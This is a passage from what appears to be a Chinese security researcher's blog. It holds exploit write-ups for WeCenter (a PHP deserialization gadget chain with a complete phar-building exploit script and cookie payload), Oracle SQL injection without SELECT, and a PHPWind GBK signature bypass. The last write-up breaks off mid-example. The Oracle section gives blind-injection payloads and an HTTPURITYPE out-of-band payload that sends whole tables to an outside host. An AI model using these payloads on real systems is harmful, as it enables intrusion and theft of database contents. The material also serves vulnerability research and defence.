&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(</span><br><span class="line">			<span class="string">&#x27;ERR_TEMPLATE&#x27;</span>,</span><br><span class="line">			<span class="keyword">array</span>(<span class="string">&#x27;template&#x27;</span> =&gt; $tpl)</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在template方法中，通过findFile方法获取模板文件的绝对路径，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">findFile</span>(<span class="params">$type, $file</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// get the set of paths</span></span><br><span class="line">	$set = <span class="keyword">$this</span>-&gt;__config[$type . <span class="string">&#x27;_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// start looping through the path set</span></span><br><span class="line">	<span class="keyword">foreach</span> ($set <span class="keyword">as</span> $path) &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// get the path to the file</span></span><br><span class="line">		$fullname = $path . $file;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// is the path based on a stream?</span></span><br><span class="line">		<span class="keyword">if</span> (strpos($path, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">			<span class="comment">// not a stream, so do a realpath() to avoid</span></span><br><span class="line">			<span class="comment">// directory traversal attempts on the local file</span></span><br><span class="line">			<span class="comment">// system. Suggested by Ian Eure, initially</span></span><br><span class="line">			<span class="comment">// rejected, but then adopted when the secure</span></span><br><span class="line">			<span class="comment">// compiler was added.</span></span><br><span class="line">			$path = realpath($path); <span class="comment">// needed for substr() later</span></span><br><span class="line"></span><br><span class="line">			$fullname = realpath($fullname);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// the substr() check added by Ian Eure to make sure</span></span><br><span class="line">		<span class="comment">// that the realpath() results in a directory registered</span></span><br><span class="line">		<span class="comment">// with Savant so that non-registered directores are not</span></span><br><span class="line">		<span class="comment">// accessible via directory traversal attempts.</span></span><br><span class="line">		<span class="keyword">if</span> (file_exists($fullname) &amp;&amp; is_readable($fullname) &amp;&amp;</span><br><span class="line">			substr($fullname, <span class="number">0</span>, strlen($path)) == $path) &#123;</span><br><span class="line">			<span class="keyword">return</span> $fullname;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// could not find the file in the set of paths</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>可见模板的目录来自__config[$type . ‘_path’]成员变量，模板文件名来自tpl变量，都可以通过反序列控制这些变量。如果文件存在就会直接返回该文件路径然后包含该文件，所以在反序列时，可以实现任意文件包含。</p>
<p>接着需要找一个能触发Savant3类__toString方法的链。<br>在system/Zend/Mail/Protocol/Imap.php中，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Zend_Mail_Protocol_Imap</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ........</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>
<p>跟入logout方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_socket) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;requestAndResponse(<span class="string">&#x27;LOGOUT&#x27;</span>, <span class="keyword">array</span>(), <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Zend_Mail_Protocol_Exception $e) &#123;</span><br><span class="line">            <span class="comment">// ignoring exception</span></span><br><span class="line">        &#125;</span><br><span class="line">        fclose(<span class="keyword">$this</span>-&gt;_socket);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_socket = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在设置了_socket成员变量的情况下会接着调用requestAndResponse方法，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">requestAndResponse</span>(<span class="params">$command, $tokens = <span class="keyword">array</span>(<span class="params"></span>), $dontParse = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sendRequest($command, $tokens, $tag);</span><br><span class="line">    $response = <span class="keyword">$this</span>-&gt;readResponse($tag, $dontParse);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendRequest</span>(<span class="params">$command, $tokens = <span class="keyword">array</span>(<span class="params"></span>), &amp;$tag = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!$tag) &#123;</span><br><span class="line">        ++<span class="keyword">$this</span>-&gt;_tagCount;</span><br><span class="line">        $tag = <span class="string">&#x27;TAG&#x27;</span> . <span class="keyword">$this</span>-&gt;_tagCount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $line = $tag . <span class="string">&#x27; &#x27;</span> . $command;</span><br></pre></td></tr></table></figure>

<p>在sendRequest方法中，++操作符对对象类型无影响，_tagCount属性和’TAG’字符串进行了拼接，将_tagCount属性设置为Savant3的实例对象就能触发Savant3的toString魔术方法进而实现利用。</p>
<p>反序列触发点就不再写了，直接看之前的文章即可。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>/?/publish/<br>注册完账号后，在发起问答里上传被包含的图片 </p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_1.jpg" alt="-w1393"></p>
<p>uploads/question/20200122/81f8ed3cbc7fe76fc7b18e28108316b9.jpg</p>
<p>然后生成Phar, 访问plugins/wc_editor/editor.php文件可获取到绝对路径，也可以使用相对路径。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_2.jpg" alt="-w932"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Savant3</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $__config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template&#x27;</span>] = <span class="string">&#x27;81f8ed3cbc7fe76fc7b18e28108316b9.jpg&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template_path&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&quot;/Applications/MAMP/htdocs/test/wecenter/uploads/question/20200122/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Zend_Mail_Protocol_Imap</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_socket;</span><br><span class="line">    <span class="keyword">protected</span> $_tagCount;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_socket = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_tagCount = <span class="keyword">new</span> Savant3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> Zend_Mail_Protocol_Imap();</span><br><span class="line"></span><br><span class="line">$filename = <span class="string">&quot;exp.phar&quot;</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>生成后接着上传phar文件。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_3.jpg" alt="-w1427"></p>
<p>得到phar文件地址，<br>uploads/question/20200122/126d8d61e2d864a875dc714380b833a6.jpg</p>
<p>接着访问/?/m/weixin/binding/ 绑定微信，将phar文件地址替换到以下cookie里 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie前缀_WXConnect&#x3D;&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:&quot;aa&quot;&#125;,&quot;access_user&quot;:&#123;&quot;nickname&quot;:&quot;aaa&quot;,&quot;headimgurl&quot;:&quot;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;question&#x2F;20200122&#x2F;126d8d61e2d864a875dc714380b833a6.jpg&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_4.jpg" alt="-w1068"></p>
<p>最后访问/?/account/ajax/synch_img/ 即可触发反序列。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_5.jpg" alt="-w518"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>1.<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7077">https://xz.aliyun.com/t/7077</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/11/24/ORACLE-无SELECT注入/"><span>ORACLE 无SELECT注入</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/11/24/ORACLE-无SELECT注入/" rel="bookmark">
        <time class="entry-date published" datetime="2019-11-24T10:43:37.000Z">
          2019-11-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在实际测试中, 经常遇到一出现SELECT就被拦截的场景, 对于无法多行查询的注入来说,一般遇到这种场景就告别出数据了(能出个user等信息)。闲着读ORACLE文档的时候, 发现ORACLE支持使用Xpath进行查询, 通过使用Xpath可以实现无SELECT查询数据。</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694">https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694</a></p>
<blockquote>
<p>Description of DBUriType<br>The DBUriType is a subtype of the UriType that provides support for of DBUri-refs. A DBUri-ref is an intra-database URL that can be used to reference any row or row-column data in the database. The URL is specified as an XPath expression over a XML visualization of the database. The schemas become elements which contain tables and views. These tables and view further contain the rows and columns inside them.</p>
</blockquote>
<p>从文档中可以看出DBUriType支持使用XPath表达式查询数据库中的数据。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_1.jpg" alt="-w724"></p>
<p>从上图中能够看出虚拟视图的结构,很容易的能够看出uri的格式为/oradb/schemaname/tablename/ROW[predicate_expression],oradb可省略(也支持查询视图)。</p>
<p>正常查询结果。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_2.jpg" alt="-w319"></p>
<p>使用DBURITYPE查询结果。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_3.jpg" alt="-w338"></p>
<p>本地用JDBC简单搭建个非dba ORACLE SQL注入环境。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">String username = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">resp.setHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>);</span><br><span class="line">    Connection conn = DriverManager.getConnection(<span class="string">&quot;jdbc:oracle:thin:@39.108.232.59:49161:xe&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;oracle&quot;</span>);</span><br><span class="line">    Statement sts = conn.createStatement();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(username.toLowerCase().contains(<span class="string">&quot;select&quot;</span>))&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;含有非法字符&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(String.format(<span class="string">&quot;select count(*) from HR.test where username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">    ResultSet rs = sts.executeQuery(String.format(<span class="string">&quot;select count(*) from HR.test where username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">    rs.next();</span><br><span class="line">    <span class="keyword">int</span> row = rs.getInt(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(row &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;已注册&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;未注册&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>/oradb/schemaname/tablename/ROW[predicate_expression]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select DBURITYPE(&#39;&#x2F;HR&#x2F;TEST&#x2F;ROW[USERNAME&#x3D;&quot;admin&quot;]&#x2F;USERNAME&#39;).getxml() from dual </span><br></pre></td></tr></table></figure>
<p>在测试盲注时, 我没能在predicate_expression中实现模糊查询或者通配, 大概翻了下文档也没找到,只能够进行完整的匹配,不能模糊查询或者通配基本没法盲注。<br>所以在这里换成了使用extractvalue解析查询出来的xml再进行盲注。<br>/checkUsername?username=admin’ and extractvalue(DBURITYPE(‘/HR/TEST’).getxml(),’/TEST/ROW[1]/PASSWORD’)like’admin%25’–<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_4.jpg" alt="-w984"></p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_5.jpg" alt="-w1011"></p>
<p>能够实现盲注, extractvalue容易被拦,可以换成extract进行盲注,需要查询第二行时修改为ROW[2]即可查询。<br>使用extract盲注时, 需注意查询出的xml结果会带有列名<code>&lt;PASSWORD&gt;admin&lt;/PASSWORD&gt;</code>。</p>
<h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>oracle本身能够很容易的外带数据, 在能够发送HTTP请求出网时就不再需要盲注,这里直接使用httpuritype外带出dburitype查询出的数据。</p>
<p>/checkUsername?username=a’ and HTTPURITYPE(‘<a target="_blank" rel="noopener" href="http://host/&#39;||">http://HOST/&#39;||</a> DBURITYPE(‘/HR/TEST’).getxml()).getcontenttype() is null–</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_6.jpg" alt="-w1400"><br>外带出了表中的所有数据, 在表中数据数量过于庞大时发送GET请求可能会出现问题。可以使用上面的extract外带一行数据等方法。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_7.jpg" alt="-w902"></p>
<h3 id="SSRF-CRLF"><a href="#SSRF-CRLF" class="headerlink" title="SSRF + CRLF"></a>SSRF + CRLF</h3><p>使用httpuritype发送HTTP请求存在CRLF问题, 在存在注入无法RCE时可以尝试打内网的redis等。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_8.jpg" alt="-w1231"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694">https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694</a><br><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb15dbu.htm#i1032143">https://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb15dbu.htm#i1032143</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/WEB/">WEB</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/08/30/PHPWIND-老版本GBK-任意管理API调用/"><span>PHPWIND 老版本GBK 任意管理API调用</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/08/30/PHPWIND-老版本GBK-任意管理API调用/" rel="bookmark">
        <time class="entry-date published" datetime="2019-08-30T09:29:36.000Z">
          2019-08-30
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    几年前,PHPWIND出过一个MD5 Padding可实现调用任意管理api方法的问题自己写了个exp, 不过遇到个老gbk(2014)版本没法成功利用, 下载了个GBK版本看了下代码。之前漏洞成因可以查看Reference链接,这里不再细谈。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>​    直接对比一下两个版本关键代码的不同之处。</p>
<p>​    UTF版本    src/windid/service/user/srv/WindidUserService.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlash</span>(<span class="params">$uid, $appId, $appKey, $getHtml = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">	$time = Pw::getTime();</span><br><span class="line">	$key = WindidUtility::appKey($appId, $time, $appKey, <span class="keyword">array</span>(<span class="string">&#x27;uid&#x27;</span>=&gt;$uid, <span class="string">&#x27;type&#x27;</span>=&gt;<span class="string">&#x27;flash&#x27;</span>, <span class="string">&#x27;m&#x27;</span>=&gt;<span class="string">&#x27;api&#x27;</span>, <span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;doAvatar&#x27;</span>, <span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;avatar&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;uid&#x27;</span>=&gt;<span class="string">&#x27;undefined&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>​                    src/windid/service/base/WindidUtility.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">appKey</span>(<span class="params">$apiId, $time, $secretkey, $get, $post</span>) </span>&#123;</span><br><span class="line">	<span class="comment">// 注意这里需要加上__data，因为下面的buildRequest()里加了。</span></span><br><span class="line">	$array = <span class="keyword">array</span>(<span class="string">&#x27;windidkey&#x27;</span>, <span class="string">&#x27;clientid&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;_json&#x27;</span>, <span class="string">&#x27;jcallback&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>,</span><br><span class="line">				   <span class="string">&#x27;Filename&#x27;</span>, <span class="string">&#x27;Upload&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;__data&#x27;</span>);</span><br><span class="line">	$str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	ksort($get);</span><br><span class="line">	ksort($post);</span><br><span class="line">	<span class="keyword">foreach</span> ($get <span class="keyword">AS</span> $k=&gt;$v) &#123;</span><br><span class="line">		<span class="keyword">if</span> (in_array($k, $array)) <span class="keyword">continue</span>;</span><br><span class="line">		$str .=$k.$v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">foreach</span> ($post <span class="keyword">AS</span> $k=&gt;$v) &#123;</span><br><span class="line">		<span class="keyword">if</span> (in_array($k, $array)) <span class="keyword">continue</span>;</span><br><span class="line">		$str .=$k.$v;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> md5(md5($apiId.<span class="string">&#x27;||&#x27;</span>.$secretkey).$time.$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    GBK版本    src/windid/service/user/srv/WindidUserService.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlash</span>(<span class="params">$uid, $appId, $appKey, $getHtml = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">	$time = Pw::getTime();</span><br><span class="line">	$key = WindidUtility::appKey($appId, $time, $appKey, <span class="keyword">array</span>(<span class="string">&#x27;uid&#x27;</span>=&gt;$uid, <span class="string">&#x27;type&#x27;</span>=&gt;<span class="string">&#x27;flash&#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;uid&#x27;</span>=&gt;<span class="string">&#x27;undefined&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>​                    src/windid/service/base/WindidUtility.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">appKey</span>(<span class="params">$apiId, $time, $secretkey, $get, $post</span>) </span>&#123;</span><br><span class="line">	$array = <span class="keyword">array</span>(<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;windidkey&#x27;</span>, <span class="string">&#x27;clientid&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;_json&#x27;</span>, <span class="string">&#x27;jcallback&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>, <span class="string">&#x27;Filename&#x27;</span>, <span class="string">&#x27;Upload&#x27;</span>, <span class="string">&#x27;token&#x27;</span>);</span><br><span class="line">	$str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	ksort($get);</span><br><span class="line">	ksort($post);</span><br><span class="line">	<span class="keyword">foreach</span> ($get <span class="keyword">AS</span> $k=&gt;$v) &#123;</span><br><span class="line">		<span class="keyword">if</span> (in_array($k, $array)) <span class="keyword">continue</span>;</span><br><span class="line">		$str .=$k.$v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">foreach</span> ($post <span class="keyword">AS</span> $k=&gt;$v) &#123;</span><br><span class="line">		<span class="keyword">if</span> (in_array($k, $array)) <span class="keyword">continue</span>;</span><br><span class="line">		$str .=$k.$v;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> md5(md5($apiId.<span class="string">&#x27;||&#x27;</span>.$secretkey).$time.$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里很大的一个区别是在GBK版本中appKey签名方法, 竟然不将m、c、a参数值加入签名中计算, 那么相当于我们能够随意修改这些参数。GBK版本中, showFlash方法中调用appKey方法时也未将m、c、a参数加入到get数组中。</p>
<p>那么相当于我们在访问/index.php?m=profile&amp;c=avatar&amp;_left=avatar</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;FlashVars&quot;</span> <span class="attr">value</span>=<span class="string">&quot;postAction=ra_postAction&amp;redirectURL=/&amp;requestURL=http%3A%2F%2Flocalhost%2Fphpwindgbk%2Fwindid%2Findex.php%3Fm%3Dapi%26c%3Davatar%26a%3DdoAvatar%26uid%3D2%26windidkey%3D7d0cff9b85cc0f62fe062421d1caf067%26time%3D1567155029%26clientid%3D1%26type%3Dflash&amp;avatar=http%3A%2F%2Flocalhost%2Fphpwindgbk%2Fwindid%2Fattachment%2Favatar%2F000%2F00%2F00%2F2.jpg%3Fr%3D66455&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

